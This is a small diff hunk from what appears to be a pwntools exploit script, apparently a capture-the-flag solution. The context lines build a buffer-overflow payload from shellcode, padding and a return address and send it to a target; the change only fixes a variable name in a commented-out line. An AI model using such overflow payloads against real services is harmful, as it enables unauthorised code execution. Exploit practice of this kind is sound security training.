@@ -189,7 +189,7 @@ payload = shellcode + 'A' * (40 - len(shellcode)) + address
 print conn.recvline()
 conn.sendline(payload)
 # -- OR --
-# r.sendlineafter("Command:",payload)
+# conn.sendlineafter("Command:",payload)
 
 ###############################################################################
 # Shell
